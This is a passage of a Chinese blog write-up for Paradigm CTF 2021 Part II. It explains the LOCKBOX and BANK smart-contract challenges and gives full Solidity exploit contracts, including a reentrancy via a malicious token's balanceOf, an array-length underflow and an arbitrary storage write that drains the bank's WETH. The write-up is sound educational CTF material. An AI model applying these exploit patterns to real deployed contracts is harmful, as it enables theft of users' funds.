s.toString(<span class="hljs-string">&#x27;hex&#x27;</span>);<br><br>  <span class="hljs-comment">// stage3 require: out of order</span><br>  <span class="hljs-keyword">if</span> (sBN &lt; rBN) &#123;<br>    <span class="hljs-keyword">continue</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// // stage3 require: this is a bit odd</span><br>  <span class="hljs-keyword">if</span> (sBN.slice(-<span class="hljs-number">2</span>) % <span class="hljs-number">2</span> != <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">continue</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;0x&#x27;</span> + v.toString(<span class="hljs-number">16</span>));<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;0x&#x27;</span> + r.toString(<span class="hljs-string">&#x27;hex&#x27;</span>));<br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;0x&#x27;</span> + s.toString(<span class="hljs-string">&#x27;hex&#x27;</span>));<br><br><br></code></pre></td></tr></table></figure>
+
+<p>得到答案</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">v</span> = <span class="hljs-number">0</span>x<span class="hljs-number">1</span>c<br><span class="hljs-attribute">r</span> = <span class="hljs-number">0</span>x<span class="hljs-number">1</span>f<span class="hljs-number">9</span>c<span class="hljs-number">5510565172835329</span>f<span class="hljs-number">4</span>e<span class="hljs-number">0107</span>b<span class="hljs-number">3</span>af<span class="hljs-number">787</span>bf<span class="hljs-number">46</span>d<span class="hljs-number">1690</span>f<span class="hljs-number">7</span>e<span class="hljs-number">81</span>aba<span class="hljs-number">39</span>e<span class="hljs-number">47</span>c<span class="hljs-number">9940</span>d<span class="hljs-number">43</span><br><span class="hljs-attribute">s</span> = <span class="hljs-number">0</span>x<span class="hljs-number">6</span>e<span class="hljs-number">95</span>dc<span class="hljs-number">6553997968</span>a<span class="hljs-number">1</span>be<span class="hljs-number">6</span>cc<span class="hljs-number">8</span>ae<span class="hljs-number">66</span>dc<span class="hljs-number">1730</span>cd<span class="hljs-number">1965</span>f<span class="hljs-number">8</span>b<span class="hljs-number">3</span>e<span class="hljs-number">7114</span>ca<span class="hljs-number">0</span>f<span class="hljs-number">9</span>df<span class="hljs-number">15</span>fc<span class="hljs-number">3</span>e<span class="hljs-number">98</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="Stage2"><a href="#Stage2" class="headerlink" title="Stage2"></a>Stage2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function solve(uint16 a, uint16 b) public _ &#123;<br>    require(a &gt; 0 &amp;&amp; b &gt; 0 &amp;&amp; a + b &lt; a, &quot;something doesn&#x27;t add up&quot;);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>取了 2个 storage的uint 。</p>
+<h3 id="Stage3"><a href="#Stage3" class="headerlink" title="Stage3"></a>Stage3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function solve(uint idx, uint[4] memory keys, uint[4] memory lock) public _ &#123;<br>    require(keys[idx % 4] == lock[idx % 4], &quot;key did not fit lock&quot;);<br><br>    for (uint i = 0; i &lt; keys.length - 1; i++) &#123;<br>        require(keys[i] &lt; keys[i + 1], &quot;out of order&quot;);<br>    &#125;<br><br>    for (uint j = 0; j &lt; keys.length; j++) &#123;<br>        require((keys[j] - lock[j]) % 2 == 0, &quot;this is a bit odd&quot;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这时的slot部署是这样的</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">slot0</span>    idx      guess v  <br><span class="hljs-attribute">slot1</span>    keys[<span class="hljs-number">0</span>]        r  <br><span class="hljs-attribute">slot2</span>    keys[<span class="hljs-number">1</span>]        s <br><span class="hljs-attribute">slot3</span>    keys[<span class="hljs-number">2</span>]          <br><span class="hljs-attribute">slot4</span>    keys[<span class="hljs-number">3</span>]             <br><span class="hljs-attribute">slot5</span>    lock[<span class="hljs-number">0</span>]<br><span class="hljs-attribute">slot6</span>    lock[<span class="hljs-number">1</span>]<br></code></pre></td></tr></table></figure>
+
+<p>这里有三个条件</p>
+<ol>
+<li><p>keys[idx % 4] == lock[idx % 4]</p>
+<p>由于idx = 0xff1c，所以idx % 4 = 0</p>
+<p>即keys[0] == lock[0]</p>
+</li>
+<li><p>keys[i] &lt; keys[i + 1]</p>
+<p>要求呈递增排列</p>
+</li>
+<li><p>(keys[j] - lock[j]) % 2 == 0</p>
+<p>对应位置的差值必须是偶数，两个偶数相减肯定是偶数，两个奇数相减肯定也是偶数。</p>
+</li>
+</ol>
+<h3 id="Stage4"><a href="#Stage4" class="headerlink" title="Stage4"></a>Stage4</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function solve(bytes32[6] choices, uint choice) public _ &#123;<br>    require(choices[choice % 6] == keccak256(abi.encodePacked(&quot;choose&quot;)), &quot;wrong choice!&quot;);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>要求在前6块slot中部署一个abi.encodePacked(“choose”) </p>
+<p>这里还剩下slot3和slot4为空</p>
+<p>由于需要满足差值为偶数，所以只能放在slot4</p>
+<h3 id="Stage5"><a href="#Stage5" class="headerlink" title="Stage5"></a>Stage5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function solve() public _ &#123;<br>    require(msg.data.length &lt; 256, &quot;a little too long&quot;);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>要求整个data的长度不能超过256</p>
+<p>所以综上，得出攻击代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs solidity">import &quot;./Setup.sol&quot;;<br><br>contract lockBoxExploit &#123;<br>    Entrypoint public entrypoint;<br>    constructor(address _setup) public &#123;<br>        entrypoint = lockBoxSetup(_setup).entrypoint();<br>    &#125;<br>    function exploit() public &#123;<br>        bytes memory data = abi.encodePacked(<br>            entrypoint.solve.selector,<br>            uint(uint16(0xff1c) | (uint256(bytes32(bytes4(blockhash(block.number - 1))))),<br>            bytes32(0x1f9c5510565172835329f4e0107b3af787bf46d1690f7e81aba39e47c9940d43), //r<br>            bytes32(0x6e95dc6553997968a1be6cc8ae66dc1730cd1965f8b3e7114ca0f9df15fc3e98), //s<br>            bytes32(0x6e95dc6553997968a1be6cc8ae66dc1730cd1965f8b3e7114ca0f9df15fc3e9a), //满足差值偶数<br>            bytes32(keccak256(&#x27;choose&#x27;)),<br>            bytes32(0x1f9c5510565172835329f4e0107b3af787bf46d1690f7e81aba39e47c9940d43), // =r<br>            bytes32(0x0000000000000000000000000000000000000000000000000000000000000004)  //做的choice 也就是指向abi.encodePakced(&quot;choose&quot;)的指针<br>        );<br>        uint size = data.length;<br>        address entry = address(entrypoint);<br>        assembly&#123;<br>            switch call(gas(),entry,0,add(data,0x20),size,0,0)<br>            case 0 &#123;<br>                returndatacopy(0x00,0x00,returndatasize())<br>                revert(0, returndatasize())<br>            &#125;<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="BANK"><a href="#BANK" class="headerlink" title="BANK"></a>BANK</h2><p>要求是清空bank合约中的50个WETH</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function isSolved() external view returns (bool) &#123;<br>    return weth.balanceOf(address(bank)) == 0;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>阅读bank代码可以发现</p>
+<ul>
+<li><p>depositToken, withdrawToken等函数都没有防止重入的措施</p>
+<ul>
+<li>没有<code>nonReentry</code>修饰符</li>
+</ul>
+</li>
+<li><p>存在数组越界情况</p>
+<ul>
+<li><p><code>accounts[msg.sender].length--;</code>  </p>
+<p>如果此时的 <code>accounts[msg.sender].length == 0</code> ,则会使得 <code>accounts[msg.sender].length</code> 下溢出</p>
+<p>由此可以满足 <code>setAccountName</code> 的条件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function setAccountName(uint accountId, string name) external &#123;<br>    require(accountId &lt; accounts[msg.sender].length, &quot;setAccountName/invalid-account&quot;);<br><br>    accounts[msg.sender][accountId].accountName = name;<br>&#125;<br></code></pre></td></tr></table></figure></li>
+<li><p><code>account.uniqueTokens--;</code></p>
+</li>
+</ul>
+</li>
+<li><p>复杂的数据结构</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">struct Account &#123;<br>    string accountName;<br>    uint uniqueTokens;<br>    mapping(address =&gt; uint) balances;<br>&#125;<br><br>mapping(address =&gt; Account[]) accounts;<br></code></pre></td></tr></table></figure>
+
+<p>结合 <code>setAccountName</code> 函数，可以在任何我们感兴趣的<a target="_blank" rel="noopener" href="https://sissice.github.io/2022/08/09/%E5%90%88%E7%BA%A6%E5%8F%98%E9%87%8F%E5%AD%98%E5%82%A8%E6%9C%BA%E5%88%B6/">Storage</a>进行写入</p>
+</li>
+</ul>
+<p>于是想到可以先利用重入使 <code>accounts[msg.sender].length</code> 下溢，再在Storage写入我感兴趣的值，比如我的账户的WETH的余额等，然后再调用<code>withdraw</code>函数取出合约中所有的WETH到我的账户上。</p>
+<h3 id="重入和下溢"><a href="#重入和下溢" class="headerlink" title="重入和下溢"></a>重入和下溢</h3><p>分析<code>withdarwToken</code>函数发现，有如下两个函数涉及到外部合约的调用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs solidity">ERC20Like(token).balanceOf(msg.sender)<br>ERC20Like(token).transferFrom(msg.sender, address(this), amount)<br></code></pre></td></tr></table></figure>
+
+<p>并且withdarwToken和closeLastAccount都会涉及到 <code>accounts[msg.sender].length--;</code>  </p>
+<p>由此得到一个重入逻辑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">deposit(0, address(this), 0) // 第一次调用balanceOf重入,len=1,uniqueTokens == 0<br>    withdraw(0, address(this), 0) // 第二次调用balanceOf重入,len=1,uniqueTokens == 0<br>        deposit(0, address(this), 0) // 第三次调用balanceOf重入,len=1,uniqueTokens == 0<br>              closeLastAccount() // (通过检查 .length &gt; 0 &amp;&amp; uniqueTokens == 0)<br>        deposit 继续执行并将 uniqueTokens 设置为 1 <br>    withdraw 继续执行并再次删除帐户（通过 uniqueTokens == 1 检查） <br>deposit 继续执行，我们不关心它的作用<br></code></pre></td></tr></table></figure>
+
+<p>代码实现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs solidity">reentrancyState = 1;<br>bank.depositToken(0, address(this), 0);  <br><br>function balanceOf(address  who ) public returns (uint256) &#123;<br>	uint result = balances[who];<br>	<br>    if (reentrancyState == 1) &#123;<br>        reentrancyState++;<br>        bank.withdrawToken(0, this, 0);<br>    &#125; else if (reentrancyState == 2) &#123;<br>        reentrancyState++;<br>        bank.depositToken(0, this, 0);<br>    &#125; else if (reentrancyState == 3) &#123;<br>        reentrancyState++;<br>        bank.closeLastAccount();<br>    &#125;<br><br>    return result;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="任意写入"><a href="#任意写入" class="headerlink" title="任意写入"></a>任意写入</h3><p>再看一下 <code>setAccountName</code> 函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function setAccountName(uint accountId, string name) external &#123;<br>    require(accountId &lt; accounts[msg.sender].length, &quot;setAccountName/invalid-account&quot;);<br><br>    accounts[msg.sender][accountId].accountName = name;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>联系数据结构</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">struct Account &#123;<br>    string accountName;<br>    uint uniqueTokens;<br>    mapping(address =&gt; uint) balances;<br>&#125;<br><br>mapping(address =&gt; Account[]) accounts;<br></code></pre></td></tr></table></figure>
+
+<p>可以想到计算出一个accountId</p>
+<p>可以通过 <code>setAccountName</code> 来设置WETH的余额</p>
+<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs inform7">slot(accounts<span class="hljs-comment">[msg.sender]</span><span class="hljs-comment">[accountId]</span>.accountName) == slot(accounts<span class="hljs-comment">[msg.sender]</span><span class="hljs-comment">[accountId]</span>.balances<span class="hljs-comment">[WETH]</span>)<br><br>slot(accounts<span class="hljs-comment">[msg.sender]</span><span class="hljs-comment">[accountId]</span>.accountName) = <br>&#123;<br>	base_key = keccak(abi.encodePacked(msg.sender, 0x02)); //mapping(address =&gt; Account<span class="hljs-comment">[]</span>)<br>	acc_key = keccak(base_key) + 3 * accountId //Account<span class="hljs-comment">[]</span> 类似于动态数组 且Account占三个slot<br>	accountName_key = acc_key + 0x00 //accountName处于第一位<br>&#125;<br><br>slot(accounts<span class="hljs-comment">[msg.sender]</span><span class="hljs-comment">[accountId]</span>.balances<span class="hljs-comment">[WETH]</span>) = <br>&#123;<br>    base_key2 = keccak(abi.encodePacked(msg.sender, 0x02));<br>	acc_key2 = keccak(base_key2) + 3 * accountId<br>	balances<span class="hljs-comment">[WETH]</span>_key = keccak(abi.encodePacked(address(WETH), acc_key2+0x02)) //balances处于第三位<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>由此可以得到以下攻击代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs solidity">import &quot;./Setup.sol&quot;;<br><br>contract BadToken is ERC20Like &#123;<br>    mapping(address =&gt; uint) balances;<br><br>    uint stage = 0;<br><br>    function transfer(address dst, uint qty) public returns (bool) &#123;<br>        balances[msg.sender] -= qty;<br>        balances[dst] += qty;<br>        return true;<br>    &#125;<br><br>    function transferFrom(address src, address dst, uint qty) public returns (bool) &#123;<br>        balances[src] -= qty;<br>        balances[dst] += qty;<br>        return true;<br>    &#125;<br><br>    function approve(address, uint) public returns (bool) &#123;<br>        return true;<br>    &#125;<br><br>    function balanceOf(address who) public view returns (uint) &#123;<br>        uint result = balances[who];<br><br>        if (reentrancyState == 1) &#123;<br>            reentrancyState++;<br>            bank.withdrawToken(0, this, 0);<br>        &#125; else if (reentrancyState == 2) &#123;<br>            reentrancyState++;<br>            bank.depositToken(0, this, 0);<br>        &#125; else if (reentrancyState == 3) &#123;<br>            reentrancyState++;<br>            bank.closeLastAccount();<br>        &#125;<br><br>        return result;<br>    &#125;<br><br>    Bank private bank;<br>    WETH9 private weth;<br>    uint public reentrancyState;<br><br>    function exploit(bankSetup setup) public &#123;<br>        bank = setup.bank();<br>        weth = setup.weth();<br><br>        reentrancyState = 1;<br>        bank.depositToken(0, address(this), 0);<br><br>        bytes32 myArraySlot = keccak256(bytes32(address(this)), uint(2));<br>        bytes32 myArrayStart = keccak256(myArraySlot);<br><br>        uint account = 0;<br>        uint slotsNeeded;<br>        while (true) &#123;<br>            bytes32 account0Start = bytes32(uint(myArrayStart) + 3*account);<br>            bytes32 account0Balances = bytes32(uint(account0Start) + 2);<br>            bytes32 wethBalance = keccak256(bytes32(address(weth)), account0Balances);<br><br>            slotsNeeded = (uint(-1) - uint(myArrayStart));<br>            slotsNeeded++;<br>            slotsNeeded += uint(wethBalance);<br>            if (uint(slotsNeeded) % 3 == 0) &#123;<br>                break;<br>            &#125;<br>            account++;<br>        &#125;<br><br>        uint accountId = uint(slotsNeeded) / 3;<br><br>        bank.setAccountName(accountId, string(abi.encodePacked(bytes31(uint248(uint(-1))))));<br><br>        bank.withdrawToken(account, address(weth), weth.balanceOf(address(bank)));<br>    &#125;<br>&#125;<br><br>contract bankExploit &#123;<br>    constructor(bankSetup setup) public &#123;<br>        new BadToken().exploit(setup);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id><a href="#" class="headerlink" title></a></h2>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98/">#靶场刷题</a>
+      
+        <a href="/tags/Etherum/">#Etherum</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Writeup | Paradigm CTF 2021 Part Ⅱ</div>
+      <div>http://example.com/2022/09/23/Paradigm CTF 2021 Ⅱ/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Sissice</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年9月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/09/18/Paradigm%20CTF%202021%20%E2%85%A0/" title="Writeup | Paradigm CTF 2021 Part Ⅰ">
+                        <span class="hidden-mobile">Writeup | Paradigm CTF 2021 Part Ⅰ</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
